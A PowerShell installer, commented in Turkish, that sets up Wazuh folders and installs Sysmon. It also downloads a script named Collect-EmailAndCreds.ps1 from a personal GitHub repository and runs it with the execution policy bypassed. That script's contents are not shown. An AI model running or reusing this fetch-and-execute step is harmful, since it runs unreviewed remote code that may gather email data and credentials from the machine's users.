# Sysmon kurulumu ve veri toplayıcı betik çalıştırıcı (evrensel sürüm)

# Wazuh klasör yapısını oluştur
$WazuhBaseDir = "$env:ProgramData\Wazuh"
$WazuhLogsDir = "$WazuhBaseDir\Logs"

Write-Host "[*] Wazuh klasor yapisi olusturuluyor..." -ForegroundColor Yellow

# Wazuh ana klasörünü oluştur
if (-not (Test-Path $WazuhBaseDir)) {
    New-Item -ItemType Directory -Path $WazuhBaseDir -Force | Out-Null
    Write-Host "[+] Wazuh klasoru olusturuldu: $WazuhBaseDir" -ForegroundColor Green
} else {
    Write-Host "[!] Wazuh klasoru zaten mevcut: $WazuhBaseDir" -ForegroundColor Yellow
}

# Wazuh Logs klasörünü oluştur
if (-not (Test-Path $WazuhLogsDir)) {
    New-Item -ItemType Directory -Path $WazuhLogsDir -Force | Out-Null
    Write-Host "[+] Logs klasoru olusturuldu: $WazuhLogsDir" -ForegroundColor Green
} else {
    Write-Host "[!] Logs klasoru zaten mevcut: $WazuhLogsDir" -ForegroundColor Yellow
}

# Klasör yapısını doğrula
if ((Test-Path $WazuhBaseDir) -and (Test-Path $WazuhLogsDir)) {
    Write-Host "[OK] Wazuh klasor yapisi basariyla dogrulandı!" -ForegroundColor Green
} else {
    Write-Host "[ERROR] Wazuh klasor yapisi olusturulamadi!" -ForegroundColor Red
    exit 1
}

Write-Host "`n[*] Sysmon kurulumu baslatiliyor..." -ForegroundColor Cyan

$TempDir = "$env:TEMP\SysmonInstall"
$SysmonZip = "$TempDir\Sysmon.zip"
$SysmonDir = "$TempDir\Sysmon"
$SysmonConfig = "$TempDir\sysmonconfig.xml"
$CollectorScript = "$TempDir\Collect-EmailAndCreds.ps1"

$SysmonURL = "https://download.sysinternals.com/files/Sysmon.zip"
$ConfigURL = "https://raw.githubusercontent.com/ubden/ubden/refs/heads/main/sysmon.xml"
$CollectorURL = "https://raw.githubusercontent.com/ubden/ubden/refs/heads/main/Collect-EmailAndCreds.ps1"

# Temiz başlangıç
if (Test-Path $TempDir) { Remove-Item $TempDir -Recurse -Force }
New-Item -ItemType Directory -Path $TempDir | Out-Null

# Dosyaları indir
Invoke-WebRequest -Uri $SysmonURL -OutFile $SysmonZip -UseBasicParsing
Invoke-WebRequest -Uri $ConfigURL -OutFile $SysmonConfig -UseBasicParsing
Invoke-WebRequest -Uri $CollectorURL -OutFile $CollectorScript -UseBasicParsing

# Zip çıkar
Expand-Archive -Path $SysmonZip -DestinationPath $SysmonDir -Force

# Sysmon binary tespiti
$SysmonExe = Join-Path $SysmonDir "Sysmon64.exe"
if (-not (Test-Path $SysmonExe)) {
    $SysmonExe = Join-Path $SysmonDir "Sysmon.exe"
}

# Sysmon yükle
Start-Process -FilePath $SysmonExe -ArgumentList "-accepteula -i `"$SysmonConfig`"" -Wait

# Toplayıcı scripti çalıştır
Write-Host "`n[*] Log Security Collector Calisiyor..." -ForegroundColor Cyan
Copy-Item -Path $CollectorScript -Destination "$WazuhLogsDir\Collect-EmailAndCreds.ps1" -Force
Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -File `"$WazuhLogsDir\Collect-EmailAndCreds.ps1`"" -Wait

Write-Host "[OK] Tum islemler basariyla tamamlandi." -ForegroundColor Green
